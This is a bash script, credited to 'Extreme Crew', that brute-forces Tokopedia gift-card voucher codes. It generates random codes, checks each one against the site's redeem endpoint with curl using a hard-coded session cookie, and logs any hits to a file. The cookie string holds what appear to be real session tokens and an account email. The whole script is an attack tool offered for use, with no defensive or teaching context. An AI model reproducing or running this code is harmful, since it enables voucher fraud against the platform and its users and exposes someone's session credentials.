#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
rm -f extreme.crew
clear
header
if [ ! $1 ];then
echo "1 Akun Max 10 kali generate"
echo "Usage : $0 <jumlah generate>"
echo "EX : $0 10"
exit
fi
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUyNDQ3MTQzMXxJakZLTm1wYVJrNW1SU3RLUW5CeE5WRlRZa1ZwYW1ZeVJHMDVTV1F4WTJ4bllpOXRiVzl5TkZWR2QyODlJZ289fM4fdODHQFuPOTMHd_BhTSBIDz51vsnlN1xGLFaFJrhr; _BID_TOKOPEDIA_=270b50252c10cc87501fd0002072f346; insUserData=%7B%22email%22%3A%22adi.ani%40xemne.com%22%7D; __sonar=12236491443642056464; state=eyJsZCI6Imh0dHBzOi8vYWNjb3VudHMudG9rb3BlZGlhLmNvbS90aGFua3M_dGhlbWU9ZGVmYXVsdFx1MDAyNmxkPVx1MDAyNmFjdGl2YXRpb25fdHlwZT01IiwicmVmIjoiaHR0cHM6Ly93d3cudG9rb3BlZGlhLmNvbSIsInV1aWQiOiJmZjIxYWU5Ni0wNGJhLTRlNWMtYjBhMS03MTlkZjFjZGRlY2YiLCJ0aGVtZSI6ImRlZmF1bHQifQ; _dc_gtm_UA-9801603-1=1; l=1; _ID_autocomplete_=bd4612d6657f49cb99c81ec96d0adf83; ins-gaSSId=209aa663-2dd9-2b81-4e72-a860ba5fe525_1524474925; insdrSV=4; scs=%7B%22t%22%3A1%7D; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiMjJiMDQyMGYtOGU0Zi00ODRkLWJjYTEtYmZkMmNmM2E2NzcwIiwiaXNfYWpheCI6dHJ1ZX0; pulsa-aff=undefined; _ga=GA1.2.258653389.1524471318; _gid=GA1.2.886005665.1524471318; _dc_gtm_UA-9801603-23=1; _SID_Tokopedia_=a2tiRMiEPwF_iOa7s_JYGS5G2SA3b1NZdmyCjSIe-BvszqqSVvGobJhtZq2BX1h38xnUR_Be6A24HciJOKFP3RoaaLtCIEjvOB9sdfRkhw-F24RXgqAKEvbbqM4h51b2; _uetsid=_uet01b7777b; _ampSES=039872cc1fSES151edd2643ba-30798-1524471426893; _ampUITN=0222cd8463botaf941422e92e-30798-1524471426899; _ampNV=0; _ampRV=1; _ampCon=-; _ampCity=-"
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=FPL$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	ngegas=$(ngelog $generate | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	if [[ "$ngegas" ]]; then
		echo "$ngegas"
		echo "[-$ngegas-] $generate" >> tokopedia.txt
	fi
done
rm -f extreme.crew
